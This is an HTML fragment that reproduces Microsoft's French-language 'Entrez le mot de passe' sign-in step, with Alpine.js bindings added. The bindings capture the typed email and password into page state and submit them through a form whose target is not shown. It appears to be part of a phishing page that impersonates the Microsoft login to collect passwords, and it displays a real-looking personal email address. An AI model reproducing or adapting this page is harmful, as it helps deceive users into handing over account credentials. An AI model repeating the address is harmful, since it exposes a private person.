<div x-cloak x-show="!is_login"
     x-transition:enter="transition-out-300"
     x-transition:enter-start="translate-full opacity-0"
     x-transition:enter-end="translate-none opacity-100"
     x-transition:leave="transition-in-300"
     x-transition:leave-start="display-none"
     x-transition:leave-end="display-none"
     role="main" data-bind="component: { name: 'pagination-control',
            publicMethods: paginationControlMethods,
            params: {
                enableCssAnimation: svr.ax,
                disableAnimationIfAnimationEndUnsupported: svr.Cg,
                initialViewId: initialViewId,
                currentViewId: currentViewId,
                initialSharedData: initialSharedData,
                initialError: $loginPage.getServerError() },
            event: {
                cancel: paginationControl_onCancel,
                load: paginationControlHelper.onLoad,
                unload: paginationControlHelper.onUnload,
                loadView: view_onLoadView,
                showView: view_onShow,
                setLightBoxFadeIn: view_onSetLightBoxFadeIn,
                animationStateChange: paginationControl_onAnimationStateChange } }"><!--  -->

    <div data-bind="css: { 'zero-opacity': hidePaginatedView() }" class="">
        <!-- ko if: showIdentityBanner() && (sharedData.displayName || svr.I) -->
        <div data-bind="css: {
        'animate': animate() &amp;&amp; animate.animateBanner(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }" class="animate slide-in-next">

            <div data-bind="component: { name: 'identity-banner-control',
            params: {
                userTileUrl: svr.b0,
                displayName: sharedData.displayName || svr.I,
                isBackButtonVisible: isBackButtonVisible(),
                focusOnBackButton: isBackButtonFocused(),
                backButtonDescribedBy: backButtonDescribedBy() },
            event: {
                backButtonClick: identityBanner_onBackButtonClick } }"><!--  -->

                <div class="identityBanner">
                    <!-- ko if: isBackButtonVisible -->
                    <button x-on:click="is_login = true; password = ''" type="button" class="backButton" data-bind="
        attr: { 'id': backButtonId || 'idBtn_Back' },
        ariaLabel: str['CT_HRD_STR_Splitter_Back'],
        ariaDescribedBy: backButtonDescribedBy,
        click: backButton_onClick,
        hasFocus: focusOnBackButton" id="idBtn_Back" aria-label="Retour">
                        <!-- ko ifnot: svr.Ct -->
                        <!-- ko component: 'accessible-image-control' --><!-- ko if: (isHighContrastBlackTheme || hasDarkBackground || svr.fHasBackgroundColor) && !isHighContrastWhiteTheme --><!-- /ko -->
                        <!-- ko if: (isHighContrastWhiteTheme || (!hasDarkBackground && !svr.fHasBackgroundColor)) && !isHighContrastBlackTheme -->
                        <!-- ko template: { nodes: [darkImageNode], data: $parent } --><img role="presentation" pngsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_7cc096da6aa2dba3f81fcc1c8262157c.png" svgsrc="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg" data-bind="imgSrc" src="https://logincdn.msauth.net/shared/1.0/content/images/arrow_left_a9cc2824ef3517b6c4160dcf8ff7d410.svg"><!-- /ko -->
                        <!-- /ko --><!-- /ko -->
                        <!-- /ko -->

                        <!-- ko if: svr.Ct --><!-- /ko -->
                    </button>
                    <!-- /ko -->

                    <div id="displayName" class="identity" data-bind="text: unsafe_displayName, attr: { 'title': unsafe_displayName }" x-text="email" :title="email">meledjearmel@outlook.fr</div>
                </div></div>
        </div>
        <!-- /ko -->

        <div class="pagination-view animate has-identity-banner slide-in-next" data-bind="css: {
        'has-identity-banner': showIdentityBanner() &amp;&amp; (sharedData.displayName || svr.I),
        'zero-opacity': hidePaginatedView.hideSubView(),
        'animate': animate(),
        'slide-out-next': animate.isSlideOutNext(),
        'slide-in-next': animate.isSlideInNext(),
        'slide-out-back': animate.isSlideOutBack(),
        'slide-in-back': animate.isSlideInBack() }">

            <!-- ko foreach: views -->
            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() -->
            <!-- ko template: { nodes: [$data], data: $parent } --><div data-viewid="2" data-showidentitybanner="true" data-dynamicbranding="true" data-bind="pageViewComponent: { name: 'login-paginated-password-view',
                params: {
                    serverData: svr,
                    serverError: initialError,
                    isInitialView: isInitialState,
                    username: sharedData.username,
                    displayName: sharedData.displayName,
                    hipRequiredForUsername: sharedData.hipRequiredForUsername,
                    passwordBrowserPrefill: sharedData.passwordBrowserPrefill,
                    availableCreds: sharedData.availableCreds,
                    evictedCreds: sharedData.evictedCreds,
                    useEvictedCredentials: sharedData.useEvictedCredentials,
                    showCredViewBrandingDesc: sharedData.showCredViewBrandingDesc,
                    flowToken: sharedData.flowToken,
                    defaultKmsiValue: svr.Ak === 1,
                    userTenantBranding: sharedData.userTenantBranding,
                    sessions: sharedData.sessions,
                    callMetadata: sharedData.callMetadata },
                event: {
                    updateFlowToken: $loginPage.view_onUpdateFlowToken,
                    submitReady: $loginPage.view_onSubmitReady,
                    redirect: $loginPage.view_onRedirect,
                    resetPassword: $loginPage.passwordView_onResetPassword,
                    setBackButtonState: view_onSetIdentityBackButtonState,
                    setPendingRequest: $loginPage.view_onSetPendingRequest } }"><!--  -->

                <!--  -->

                <div aria-hidden="true">
                    <input type="hidden" data-bind="value: isKmsiChecked() ? 1 : 0" value="0">
                    <input type="hidden" data-bind="value: unsafe_username" x-model="email" value="meledjearmel@outlook.fr">
                    <!-- The loginfmt input type is different as some password managers require it to be of type text.
                        Since screen readers might not hide this input, a parent div with aria-hidden true has been added. -->
                    <input type="text" data-bind="moveOffScreen, value: unsafe_displayName" class="moveOffScreen" tabindex="-1" aria-hidden="true">
                    <input type="hidden"  data-bind="value: svr.B3 ? 20 : 11" value="11">
                    <input type="hidden"  data-bind="value: isKmsiChecked() ? 1 : 3" value="3">
                    <input type="hidden"  data-bind="value: callMetadata.IsLongRunningTransaction" value="">
                    <input type="hidden"  data-bind="value: callMetadata.LongRunningTransactionPartition" value="">
                    <input type="hidden"  data-bind="value: callMetadata.HisRegion" value="">
                    <input type="hidden" data-bind="value: callMetadata.HisScaleUnit" value="">
                </div>

                <div id="loginHeader" class="row title ext-title" data-bind="externalCss: { 'title': true }">
                    <div role="heading" aria-level="1" data-bind="text: str['CT_PWD_STR_EnterPassword_Title']">Entrez le mot de passe</div>
                </div>

                <!-- ko if: showCredViewBrandingDesc --><!-- /ko -->

                <!-- ko if: unsafe_pageDescription --><!-- /ko -->

                <div class="row">
                    <div class="form-group col-md-24">
                        <div role="alert" aria-live="assertive">
                            <!-- ko if: passwordTextbox.error --><!-- /ko -->
                        </div>

                        <div class="placeholderContainer" data-bind="component: { name: 'placeholder-textbox-field',
            publicMethods: passwordTextbox.placeholderTextboxMethods,
            params: {
                serverData: svr,
                hintText: str['CT_PWD_STR_PwdTB_Label'] },
            event: {
                updateFocus: passwordTextbox.textbox_onUpdateFocus } }"><!-- ko withProperties: { '$placeholderText': placeholderText } -->
                            <!-- ko template: { nodes: $componentTemplateNodes, data: $parent } -->

                            <input x-model="password" name="password" type="password" autocomplete="off" class="form-control input ext-input text-box ext-text-box" aria-required="true" data-bind="
                textInput: passwordTextbox.value,
                ariaDescribedBy: [
                    'loginHeader passwordError',
                    showCredViewBrandingDesc ? 'credViewBrandingDesc' : '',
                    unsafe_pageDescription ? 'passwordDesc' : ''].join(' '),
                hasFocusEx: passwordTextbox.focused() &amp;&amp; !showPassword(),
                placeholder: $placeholderText,
                ariaLabel: unsafe_passwordAriaLabel,
                moveOffScreen: showPassword,
                externalCss: {
                    'input': true,
                    'text-box': true,
                    'has-error': passwordTextbox.error }" aria-describedby="loginHeader passwordError  " placeholder="Mot de passe" aria-label="Entrez le mot de passe pour meledjearmel@outlook.fr" tabindex="0">

                            <!-- ko if: svr.cH && showPassword() --><!-- /ko -->
                            <!-- /ko -->
                            <!-- /ko -->
                            <!-- ko ifnot: usePlaceholderAttribute --><!-- /ko --></div>

                        <!-- ko if: svr.cH --><!-- /ko -->
                    </div>
                </div>

                <!-- ko if: shouldHipInit --><!-- /ko -->

                <div data-bind="css: { 'position-buttons': !tenantBranding.BoilerPlateText }" class="position-buttons">
                    <div>
                        <!-- ko if: svr.C9 --><!-- /ko -->
                        <!-- ko if: svr.Bk !== false && !svr.C9 && !tenantBranding.KeepMeSignedInDisabled --><!-- /ko -->

                        <div class="row">
                            <div class="col-md-24">
                                <div class="text-13">
                                    <!-- ko if: svr.aO && svr.aE --><!-- /ko -->
                                    <!-- ko ifnot: hideForgotMyPassword -->
                                    <div class="form-group">
                                        <a id="idA_PWD_ForgotPassword" role="link" href="https://account.live.com/ResetPassword.aspx?wreply=https://login.live.com/login.srf%3fcontextid%3dCE0618DD0FCB237C%26bk%3d1654279888&amp;id=38936&amp;uiflavor=web&amp;uaid=5556a924fb1b4cd49c6254497f6a3a54&amp;mkt=FR-FR&amp;lc=1036&amp;bk=1654279888" data-bind="
                            text: unsafe_forgotPasswordText,
                            href: accessRecoveryLink || svr.R,
                            attr: { target: accessRecoveryLink &amp;&amp; '_blank' },
                            click: accessRecoveryLink ? null : resetPassword_onClick">Mot de passe oublié&nbsp;?</a>
                                    </div>
                                    <!-- /ko -->
                                    <!-- ko if: allowPhoneDisambiguation --><!-- /ko -->
                                    <!-- ko ifnot: useEvictedCredentials -->
                                    <!-- ko component: { name: "cred-switch-link-control",
                                        params: {
                                            serverData: svr,
                                            username: username,
                                            availableCreds: availableCreds,
                                            flowToken: flowToken,
                                            currentCred: { credType: 1 } },
                                        event: {
                                            switchView: credSwitchLink_onSwitchView,
                                            redirect: onRedirect,
                                            setPendingRequest: credSwitchLink_onSetPendingRequest,
                                            updateFlowToken: credSwitchLink_onUpdateFlowToken } } --><!--  -->

                                    <div class="form-group">
                                        <!-- ko if: showSwitchToCredPickerLink --><!-- /ko -->

                                        <!-- ko if: credentialCount === 1 && !(showForgotUsername || selectedCredShownOnlyOnPicker) -->
                                        <!-- ko ifnot: hideCredSwitchLink -->
                                        <a href="#" id="idA_PWD_SwitchToFido">Connexion avec une clé de sécurité</a>
                                        <!-- /ko -->

                                        <!-- ko if: displayHelp && selectedCredType === 7 --><!-- /ko -->
                                        <!-- /ko -->

                                        <!-- ko if: credentialCount === 0 && showForgotUsername --><!-- /ko -->
                                    </div>

                                    <!-- ko if: credLinkError --><!-- /ko --><!-- /ko -->

                                    <!-- ko if: evictedCreds.length > 0 --><!-- /ko -->
                                    <!-- /ko -->
                                    <!-- ko if: showChangeUserLink --><!-- /ko -->
                                </div>
                            </div>
                        </div>
                    </div>

                    <div class="win-button-pin-bottom" data-bind="css : { 'boilerplate-button-bottom': tenantBranding.BoilerPlateText }">
                        <div class="row" data-bind="css: { 'move-buttons': tenantBranding.BoilerPlateText }">
                            <div>
                                <div class="col-xs-24 no-padding-left-right button-container">

                                    <!-- ko if: isSecondaryButtonVisible --><!-- /ko -->

                                    <div data-bind="css: { 'inline-block': isPrimaryButtonVisible }" class="inline-block">
                                        <!-- type="submit" is needed in-addition to 'type' in primaryButtonAttributes observable to support IE8 -->
                                        <input x-on:click="document.querySelector('form').submit()" type="submit" class="win-button button_primary button ext-button primary ext-primary" value="Se connecter">
                                    </div>
                                </div></div>
                        </div>
                    </div>
                </div>

                <!-- ko if: tenantBranding.BoilerPlateText --><!-- /ko -->
            </div><!-- /ko -->
            <!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->

            <!-- ko if: $parent.currentViewIndex() === $index() --><!-- /ko -->
            <!-- /ko -->
        </div>
    </div></div>
